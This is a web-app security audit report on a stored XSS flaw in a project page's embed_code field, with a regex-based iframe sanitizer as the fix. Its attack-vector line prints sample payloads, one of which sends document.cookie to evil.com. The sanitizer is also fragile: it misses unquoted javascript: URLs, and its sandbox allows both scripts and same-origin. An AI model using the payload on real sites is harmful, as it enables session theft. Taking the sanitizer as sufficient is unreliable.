# Security Audit Report — XSS Vulnerability Audit

> **Date:** 2026-09-03
> **Scope:** `react-markdown` rendering, `dangerouslySetInnerHTML`, AI chat output
> **Skill used:** `testing-for-xss-vulnerabilities` (OWASP A03:2021)
> **Status:** FIX APPLIED — Stored XSS vector mitigated

---

## Findings

### 1. CRITICAL — Stored XSS via `dangerouslySetInnerHTML` (FIXED)
**Location:** `src/app/projects/[id]/page.tsx:171`
**Vulnerability:** `project.embed_code` rendered directly as HTML without sanitization
**Attack vector:** Admin enters `<script>alert(document.cookie)</script>` or `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` in embed_code field → executes on every visitor's browser
**Data flow:** Admin form → `saveProjectAction()` → Supabase DB → `getProjectById()` → `dangerouslySetInnerHTML`
**Fix applied:** Added `sanitizeEmbedCode()` function that:
- Extracts only `<iframe>` tags (for Tableau/YouTube/Plotly embeds)
- Strips all event handler attributes (`onerror`, `onload`, etc.)
- Removes `javascript:` URLs
- Adds `sandbox` attribute for defense-in-depth

### 2. SAFE — `ReactMarkdown` in Project Content
**Location:** `src/app/projects/[id]/page.tsx:178-231`
**Analysis:** `react-markdown` without `rehype-raw` escapes HTML by default. Raw HTML in `project.content` is rendered as text, not executed.
**Status:** ✅ Safe — No XSS vector

### 3. SAFE — `ReactMarkdown` in AI Chat Interface
**Location:** `src/components/ai-chat-interface.tsx:429`
**Analysis:** `react-markdown` without `rehype-raw` escapes HTML. AI responses containing `<script>` tags are rendered as text.
**Status:** ✅ Safe — No XSS vector

---

## Fix Details

### `sanitizeEmbedCode()` Function
**Location:** `src/app/projects/[id]/page.tsx:12-29`

```typescript
function sanitizeEmbedCode(html: string): string {
  // Allow only <iframe> tags with safe attributes; strip everything else
  const iframeMatch = html.match(/<iframe\b[^>]*>[\s\S]*?<\/iframe>|<iframe\b[^>]*\/?>/gi)
  if (!iframeMatch) return ''
  return iframeMatch
    .map((iframe) => {
      // Remove event handler attributes (onerror, onload, onclick, etc.)
      let cleaned = iframe.replace(/\s+on\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')
      // Remove javascript: URLs
      cleaned = cleaned.replace(/(src|href)\s*=\s*["']javascript:[^"']*["']/gi, '$1=""')
      // Ensure sandbox attribute for defense-in-depth
      if (!/sandbox\s*=/i.test(cleaned)) {
        cleaned = cleaned.replace(/<iframe\b/i, '<iframe sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"')
      }
      return cleaned
    })
    .join('\n')
}
```

**What it blocks:**
- `<script>` tags → stripped (only iframes allowed)
- `<img onerror="...">` → stripped (only iframes allowed)
- `<iframe onload="...">` → event handler removed
- `<iframe src="javascript:...">` → src emptied
- All non-iframe HTML → stripped

**What it allows:**
- `<iframe src="https://tableau.example.com/...">` → preserved
- `<iframe src="https://plot.ly/...">` → preserved
- `<iframe src="https://www.youtube.com/embed/...">` → preserved

---

## Recommendations

| # | Priority | Recommendation |
|---|---|---|
| 1 | Medium | Consider using DOMPurify library for more robust HTML sanitization |
| 2 | Low | Add CSP header (`script-src 'self'`) as defense-in-depth |
| 3 | Low | Validate `embed_code` server-side in `saveProjectAction` before DB insert |
| 4 | Low | Consider allowlisting iframe src domains (tableau.com, youtube.com, plot.ly) |
